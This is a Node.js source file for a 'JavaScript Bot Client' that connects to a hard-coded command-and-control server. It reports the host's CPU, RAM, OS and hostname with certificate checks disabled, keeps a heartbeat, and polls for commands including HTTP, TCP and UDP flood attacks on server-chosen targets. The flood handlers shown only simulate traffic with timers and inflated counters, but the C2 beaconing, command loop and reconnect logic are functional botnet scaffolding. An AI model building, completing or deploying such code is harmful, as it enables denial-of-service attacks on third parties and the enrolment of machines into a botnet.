// JavaScript Bot Client - FIXED FOR RENDER.COM
// Save as: bot_client.js
// Run: node bot_client.js

const https = require('https');
const crypto = require('crypto');
const os = require('os');

class JavaScriptBot {
    constructor() {
        this.serverUrl = "https://c2-server-io.onrender.com";
        this.botId = 'JS-' + crypto.randomBytes(4).toString('hex').toUpperCase();
        this.running = true;
        this.approved = false;
        this.activeAttacks = new Set();
        this.connectionRetries = 0;
        this.maxRetries = 5;
        this.heartbeatInterval = 10000; // 10 seconds
        this.heartbeatTimer = null;
        
        // FULL specs as server expects
        this.specs = {
            bot_id: this.botId,
            cpu_cores: os.cpus().length,
            ram_gb: Math.round(os.totalmem() / (1024 ** 3) * 10) / 10,
            os: os.platform(),
            hostname: os.hostname(),
            capabilities: {
                javascript: true,
                http: true,
                tcp: true,
                udp: true,
                resource_optimized: true,
                auto_connect: true
            }
        };
        
        this.stats = {
            total_attacks: 0,
            successful_attacks: 0,
            total_requests: 0,
            uptime: Date.now()
        };
        
        this.displayBanner();
    }
    
    displayBanner() {
        console.log('\n' + '='.repeat(70));
        console.log('  JAVASCRIPT BOT CLIENT v2.0 - RENDER.COM COMPATIBLE');
        console.log('='.repeat(70));
        console.log(`\n[+] BOT ID: ${this.botId}`);
        console.log(`[+] CPU: ${this.specs.cpu_cores} cores`);
        console.log(`[+] RAM: ${this.specs.ram_gb}GB`);
        console.log(`[+] OS: ${this.specs.os}`);
        console.log(`[+] Hostname: ${this.specs.hostname}`);
        console.log(`[+] Server: ${this.serverUrl}`);
        console.log(`[+] Heartbeat: ${this.heartbeatInterval/1000}s intervals`);
        console.log('\n[*] FEATURES:');
        console.log('    [✓] Server-defined threads');
        console.log('    [✓] Auto-reconnect');
        console.log('    [✓] Regular heartbeats');
        console.log('    [✓] Command execution');
        console.log('    [✓] Status updates');
        console.log('\n' + '='.repeat(70) + '\n');
    }
    
    async sendRequest(endpoint, method = 'GET', data = null) {
        return new Promise((resolve, reject) => {
            const url = new URL(this.serverUrl + endpoint);
            
            const options = {
                hostname: url.hostname,
                port: url.port || 443,
                path: url.pathname,
                method: method,
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json',
                    'User-Agent': 'JavaScript-Bot/1.0',
                    'Connection': 'keep-alive'
                },
                // IMPORTANT: Render.com uses self-signed certs
                rejectUnauthorized: false,
                timeout: 15000  // 15 second timeout
            };
            
            console.log(`[>] ${method} ${endpoint}`);
            
            const req = https.request(options, (res) => {
                let responseData = '';
                
                console.log(`[<] HTTP ${res.statusCode}`);
                
                res.on('data', (chunk) => {
                    responseData += chunk;
                });
                
                res.on('end', () => {
                    try {
                        if (responseData) {
                            const parsed = JSON.parse(responseData);
                            resolve(parsed);
                        } else {
                            resolve({ status: res.statusCode });
                        }
                    } catch (e) {
                        console.log(`[!] Failed to parse JSON:`, responseData);
                        resolve({ raw: responseData, status: res.statusCode });
                    }
                });
            });
            
            req.on('error', (err) => {
                console.error(`[X] Request error: ${err.message}`);
                reject(err);
            });
            
            req.on('timeout', () => {
                console.error('[X] Request timeout');
                req.destroy();
                reject(new Error('Request timeout'));
            });
            
            if (data) {
                req.write(JSON.stringify(data));
            }
            
            req.end();
        });
    }
    
    async sendHeartbeat() {
        try {
            const data = {
                bot_id: this.botId,
                specs: this.specs,
                stats: this.stats
            };
            
            const response = await this.sendRequest('/check_approval', 'POST', data);
            
            if (response.approved) {
                console.log(`[♥] Heartbeat sent - Status: Approved (${response.client_type || 'javascript'})`);
                return true;
            } else {
                console.log(`[!] Heartbeat failed:`, response);
                return false;
            }
        } catch (error) {
            console.log(`[!] Heartbeat failed: ${error.message}`);
            return false;
        }
    }
    
    async sendStatus(status, message = '') {
        try {
            const data = {
                bot_id: this.botId,
                status: status,
                message: message,
                stats: this.stats
            };
            
            await this.sendRequest('/status', 'POST', data);
            console.log(`[✓] Status: ${status} - ${message}`);
            return true;
        } catch (error) {
            console.log(`[!] Status update failed: ${error.message}`);
            return false;
        }
    }
    
    async getCommands() {
        try {
            const response = await this.sendRequest(`/commands/${this.botId}`, 'GET');
            return response.commands || [];
        } catch (error) {
            console.log(`[!] Failed to get commands: ${error.message}`);
            return [];
        }
    }
    
    async executeCommand(cmd) {
        const cmdType = cmd.type;
        
        console.log('\n' + '='.repeat(50));
        console.log(`[→] EXECUTING: ${cmdType.toUpperCase()}`);
        console.log('='.repeat(50));
        
        try {
            switch (cmdType) {
                case 'ping':
                    await this.cmdPing();
                    break;
                    
                case 'http_flood':
                    await this.cmdHttpFlood(cmd);
                    break;
                    
                case 'tcp_flood':
                    await this.cmdTcpFlood(cmd);
                    break;
                    
                case 'udp_flood':
                    await this.cmdUdpFlood(cmd);
                    break;
                    
                case 'sysinfo':
                    await this.cmdSysinfo();
                    break;
                    
                case 'stop_all':
                    await this.cmdStopAll();
                    break;
                    
                default:
                    console.log(`[!] Unknown command: ${cmdType}`);
                    await this.sendStatus('error', `Unknown command: ${cmdType}`);
            }
        } catch (error) {
            console.log(`[!] Command execution error: ${error.message}`);
            await this.sendStatus('error', error.message);
        }
    }
    
    async cmdPing() {
        await this.sendStatus('success', 'pong');
        console.log('[✓] Pong!');
    }
    
    async cmdHttpFlood(cmd) {
        const target = cmd.target;
        const duration = cmd.duration || 60;
        const threads = cmd.threads || 100;
        const method = cmd.method || 'GET';
        
        console.log('[∗] HTTP FLOOD ATTACK');
        console.log(`    Target: ${target}`);
        console.log(`    Method: ${method}`);
        console.log(`    Duration: ${duration}s`);
        console.log(`    Threads: ${threads} (Server-defined)`);
        
        this.stats.total_attacks++;
        await this.sendStatus('running', `${method} FLOOD: ${target}`);
        
        const attackId = `http_${Date.now()}`;
        this.activeAttacks.add(attackId);
        
        console.log(`[+] Simulating HTTP flood with ${threads} threads...`);
        
        // Simulate attack (with shorter time for testing)
        const attackTime = Math.min(duration, 10) * 1000; // Max 10 seconds for simulation
        
        await new Promise(resolve => {
            setTimeout(() => {
                this.activeAttacks.delete(attackId);
                this.stats.total_requests += 1000;
                this.stats.successful_attacks++;
                console.log(`[✓] HTTP flood simulation complete`);
                resolve();
            }, attackTime);
        });
        
        await this.sendStatus('success', `HTTP flood simulated: ${threads} threads`);
    }
    
    async cmdTcpFlood(cmd) {
        const target = cmd.target;
        const duration = cmd.duration || 60;
        const threads = cmd.threads || 75;
        
        console.log('[∗] TCP FLOOD ATTACK');
        console.log(`    Target: ${target}`);
        console.log(`    Duration: ${duration}s`);
        console.log(`    Threads: ${threads} (Server-defined)`);
        
        this.stats.total_attacks++;
        await this.sendStatus('running', `TCP FLOOD: ${target}`);
        
        const attackId = `tcp_${Date.now()}`;
        this.activeAttacks.add(attackId);
        
        console.log(`[+] Simulating TCP flood with ${threads} threads...`);
        
        await new Promise(resolve => {
            setTimeout(() => {
                this.activeAttacks.delete(attackId);
                this.stats.total_requests += 500;
                this.stats.successful_attacks++;
                console.log(`[✓] TCP flood simulation complete`);
                resolve();
            }, Math.min(duration, 10) * 1000);
        });
        
        await this.sendStatus('success', `TCP flood simulated: ${threads} threads`);
    }
    
    async cmdUdpFlood(cmd) {
        const target = cmd.target;
        const duration = cmd.duration || 60;
        const threads = cmd.threads || 75;
        
        console.log('[∗] UDP FLOOD ATTACK');
        console.log(`    Target: ${target}`);
        console.log(`    Duration: ${duration}s`);
        console.log(`    Threads: ${threads} (Server-defined)`);
        
        this.stats.total_attacks++;
        await this.sendStatus('running', `UDP FLOOD: ${target}`);
        
        const attackId = `udp_${Date.now()}`;
        this.activeAttacks.add(attackId);
        
        console.log(`[+] Simulating UDP flood with ${threads} threads...`);
        
        await new Promise(resolve => {
            setTimeout(() => {
                this.activeAttacks.delete(attackId);
                this.stats.total_requests += 500;
                this.stats.successful_attacks++;
                console.log(`[✓] UDP flood simulation complete`);
                resolve();
            }, Math.min(duration, 10) * 1000);
        });
        
        await this.sendStatus('success', `UDP flood simulated: ${threads} threads`);
    }
    
    async cmdSysinfo() {
        const info = [
            `CPU Cores: ${this.specs.cpu_cores}`,
            `RAM: ${this.specs.ram_gb}GB`,
            `OS: ${this.specs.os}`,
            `Hostname: ${this.specs.hostname}`,
            `Active Attacks: ${this.activeAttacks.size}`,
            `Total Attacks: ${this.stats.total_attacks}`,
            `Total Requests: ${this.stats.total_requests.toLocaleString()}`
        ].join('\n');
        
        console.log('[∗] SYSTEM INFORMATION:\n' + info);
        await this.sendStatus('success', info);
    }
    
    async cmdStopAll() {
        console.log('[!] Stopping all attacks...');
        const count = this.activeAttacks.size;
        this.activeAttacks.clear();
        console.log(`[✓] Stopped ${count} attacks`);
        await this.sendStatus('success', `Stopped ${count} attacks`);
    }
    
    async connectToServer() {
        console.log('[1] Connecting to server...');
        
        const data = {
            bot_id: this.botId,
            specs: this.specs,
            stats: this.stats
        };
        
        try {
            const response = await this.sendRequest('/check_approval', 'POST', data);
            
            if (response.approved) {
                this.approved = true;
                this.connectionRetries = 0;
                
                console.log('\n' + '='.repeat(70));
                console.log('  ✅ CONNECTION SUCCESSFUL!');
                console.log('='.repeat(70));
                console.log(`[✓] Bot ID: ${this.botId}`);
                console.log(`[✓] Approved: YES`);
                console.log(`[✓] Client Type: ${response.client_type || 'javascript'}`);
                console.log(`[✓] Ready for commands`);
                console.log('');
                
                // Send initial status
                await this.sendStatus('connected', 'JavaScript bot connected');
                
                return true;
            } else {
                console.log(`[X] Not approved:`, response);
                return false;
            }
        } catch (error) {
            this.connectionRetries++;
            
            if (this.connectionRetries <= this.maxRetries) {
                const delay = Math.min(5000 * Math.pow(2, this.connectionRetries), 30000);
                
                console.log(`[!] Connection failed: ${error.message}`);
                console.log(`[...] Retry ${this.connectionRetries}/${this.maxRetries} in ${delay/1000}s...`);
                
                await new Promise(resolve => setTimeout(resolve, delay));
                return await this.connectToServer();
            } else {
                console.log('[X] Max retries reached. Server might be down.');
                return false;
            }
        }
    }
    
    startHeartbeat() {
        if (this.heartbeatTimer) {
            clearInterval(this.heartbeatTimer);
        }
        
        this.heartbeatTimer = setInterval(async () => {
            if (this.running && this.approved) {
                await this.sendHeartbeat();
            }
        }, this.heartbeatInterval);
        
        console.log(`[✓] Heartbeat started (every ${this.heartbeatInterval/1000}s)`);
    }
    
    async run() {
        // Initial connection
        const connected = await this.connectToServer();
        
        if (!connected) {
            console.log('[!] Failed to establish connection. Exiting.');
            process.exit(1);
        }
        
        // Start heartbeat
        this.startHeartbeat();
        
        // Main command loop
        console.log('[+] Entering main command loop...\n');
        
        while (this.running && this.approved) {
            try {
                // Check for commands
                const commands = await this.getCommands();
                
                if (commands.length > 0) {
                    console.log(`[+] Received ${commands.length} command(s)`);
                    
                    // Execute commands sequentially
                    for (const cmd of commands) {
                        await this.executeCommand(cmd);
                    }
                }
                
                // Wait before next poll
                await new Promise(resolve => setTimeout(resolve, 5000));
                
                // Show status every 30 seconds
                if (Date.now() % 30000 < 5000) {
                    console.log(`[${new Date().toLocaleTimeString()}] Waiting for commands...`);
                }
                
            } catch (error) {
                console.error(`[!] Error in main loop: ${error.message}`);
                
                // Try to reconnect
                console.log('[!] Connection lost. Attempting to reconnect...');
                this.approved = false;
                
                if (this.heartbeatTimer) {
                    clearInterval(this.heartbeatTimer);
                    this.heartbeatTimer = null;
                }
                
                await new Promise(resolve => setTimeout(resolve, 10000));
                await this.run();
                return;
            }
        }
        
        // Cleanup
        if (this.heartbeatTimer) {
            clearInterval(this.heartbeatTimer);
        }
    }
}

// ========== MAIN EXECUTION ==========
console.log('\n' + '='.repeat(70));
console.log('  JAVASCRIPT BOT CLIENT - STARTING');
console.log('='.repeat(70));

const bot = new JavaScriptBot();

// Handle graceful shutdown
process.on('SIGINT', async () => {
    console.log('\n[!] Shutting down gracefully...');
    bot.running = false;
    
    if (bot.approved) {
        await bot.sendStatus('disconnected', 'Bot shutting down');
    }
    
    if (bot.heartbeatTimer) {
        clearInterval(bot.heartbeatTimer);
    }
    
    console.log('[+] Goodbye!');
    process.exit(0);
});

process.on('SIGTERM', async () => {
    console.log('\n[!] Terminating...');
    bot.running = false;
    
    if (bot.approved) {
        await bot.sendStatus('disconnected', 'Bot terminated');
    }
    
    process.exit(0);
});

// Error handling
process.on('uncaughtException', (error) => {
    console.error('[!] Uncaught Exception:', error);
    process.exit(1);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('[!] Unhandled Rejection at:', promise, 'reason:', reason);
});

// Start the bot
bot.run().catch(error => {
    console.error('[!] Fatal error:', error);
    process.exit(1);
});
